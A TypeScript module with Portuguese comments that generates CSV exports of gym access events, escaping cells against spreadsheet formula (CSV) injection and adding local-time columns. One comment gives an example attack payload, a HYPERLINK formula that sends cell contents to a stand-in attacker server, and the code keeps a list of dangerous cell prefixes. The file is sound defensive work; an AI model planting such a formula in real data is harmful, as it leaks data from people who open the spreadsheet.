/**
 * Geracao de CSV segura -- F11, Task 4.
 *
 * FUNCOES PURAS, e a pureza aqui tem uma razao pratica: a regra de escape e
 * exatamente o tipo de coisa que se testa com dezenas de entradas esquisitas,
 * e um teste que precisasse de banco e storage para provar que `=1+1` vira
 * `'=1+1` nao seria escrito com essa densidade.
 */

/**
 * Prefixos que fazem uma celula virar FORMULA quando o arquivo abre no Excel,
 * LibreOffice ou Google Sheets.
 *
 * O ataque tem nome -- CSV injection -- e o roteiro e este: alguem cadastra
 * um aluno chamado `=HYPERLINK("http://servidor-do-atacante/?"&A1)`, a
 * academia exporta os eventos de acesso, a recepcao abre no Excel e a
 * planilha faz a requisicao. O dado nunca foi executado no nosso servidor, e
 * mesmo assim vazou.
 *
 * `\t` e `\r` entram na lista porque alguns leitores os tratam como inicio de
 * celula depois de um separador.
 */
const PREFIXOS_PERIGOSOS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutraliza uma celula.
 *
 * Prefixa com aspa simples, que e a convencao que as planilhas entendem como
 * "isto e texto, nao formula". A aspa aparece na celula ao abrir, e esse
 * incomodo visual e deliberado: e o sinal de que o conteudo veio de fora e
 * nao deveria ser interpretado.
 *
 * NAO remove nem sanitiza o conteudo -- o valor original continua legivel.
 * Apagar caractere de dado exportado seria pior: a auditoria deixaria de
 * bater com o que esta no banco.
 */
export function neutralizarCelula(valor: string): string {
  if (valor === '') return valor;

  const primeiro = valor[0] ?? '';

  return PREFIXOS_PERIGOSOS.includes(primeiro) ? `'${valor}` : valor;
}

/**
 * Escapa uma celula para o formato CSV (RFC 4180).
 *
 * A ordem importa: neutraliza a formula PRIMEIRO, depois escapa as aspas.
 * Invertido, a aspa simples que acrescentamos poderia ser duplicada junto e
 * apareceria dobrada na planilha.
 */
export function formatarCelula(valor: string | number | boolean | null | undefined): string {
  if (valor === null || valor === undefined) return '';

  const texto = neutralizarCelula(String(valor));

  const precisaAspas =
    texto.includes(',') || texto.includes('"') || texto.includes('\n') || texto.includes('\r');

  if (!precisaAspas) return texto;

  return `"${texto.replaceAll('"', '""')}"`;
}

export function formatarLinha(
  celulas: readonly (string | number | boolean | null | undefined)[],
): string {
  return `${celulas.map((c) => formatarCelula(c)).join(',')}\n`;
}

/**
 * Colunas da exportacao de eventos.
 *
 * DOIS instantes, com o fuso no nome: `occurred_at_utc` e `occurred_at_local`.
 * Exportar so um deles produziria a discussao classica na conciliacao --
 * "esse acesso foi as 22h ou as 19h?" -- e a resposta depende de quem abriu a
 * planilha e em que maquina.
 *
 * O que NAO esta aqui: CPF, foto, template biometrico, divida. A exportacao e
 * o caminho mais facil de dado sair da empresa; o que ela carrega e o que a
 * operacao precisa para investigar acesso, e nada mais.
 */
export const COLUNAS_DE_EVENTO = [
  'event_id',
  'occurred_at_utc',
  'occurred_at_local',
  'received_at_utc',
  'gym_unit_id',
  'outcome',
  'reason',
  'mode',
  'method',
  'student_id',
  'student_name',
  'membership_number',
  'external_user_id',
  'device_id',
  'passage_state',
  'correlation_id',
] as const;

export interface EventoExportavel {
  id: string;
  occurredAt: string;
  receivedAt: string;
  gymUnitId: string;
  outcome: string;
  reason: string;
  mode: string;
  method: string;
  student: { id: string; fullName: string; membershipNumber: string } | null;
  externalUserId: string | null;
  deviceId: string | null;
  passageState: string | null;
  correlationId: string;
}

/**
 * Converte um evento em linha CSV.
 *
 * @param timeZone IANA da unidade, para a coluna local.
 */
export function linhaDeEvento(evento: EventoExportavel, timeZone: string): string {
  return formatarLinha([
    evento.id,
    evento.occurredAt,
    formatarLocal(evento.occurredAt, timeZone),
    evento.receivedAt,
    evento.gymUnitId,
    evento.outcome,
    evento.reason,
    evento.mode,
    evento.method,
    evento.student?.id ?? '',
    // Nome do aluno E o campo por onde a injecao entra: ele e livre e vem de
    // cadastro. `formatarCelula` neutraliza, mas vale saber por que a coluna
    // existe -- sem nome, a planilha nao serve para conferir presenca.
    evento.student?.fullName ?? '',
    evento.student?.membershipNumber ?? '',
    evento.externalUserId ?? '',
    evento.deviceId ?? '',
    evento.passageState ?? '',
    evento.correlationId,
  ]);
}

export function cabecalhoDeEvento(): string {
  return formatarLinha([...COLUNAS_DE_EVENTO]);
}

/**
 * Instante no fuso da unidade, em formato legivel por planilha.
 *
 * `sv-SE` produz `AAAA-MM-DD HH:mm:ss`, que Excel e LibreOffice reconhecem
 * como data sem depender do idioma da maquina. `pt-BR` daria `DD/MM/AAAA`,
 * que vira texto numa planilha configurada em ingles.
 */
function formatarLocal(iso: string, timeZone: string): string {
  const data = new Date(iso);

  if (!Number.isFinite(data.getTime())) return '';

  try {
    return new Intl.DateTimeFormat('sv-SE', {
      timeZone,
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    })
      .format(data)
      .replace(',', '');
  } catch {
    // Fuso invalido nao derruba a exportacao inteira: a coluna UTC continua
    // correta, e um arquivo com uma coluna vazia e melhor que nenhum arquivo.
    return '';
  }
}
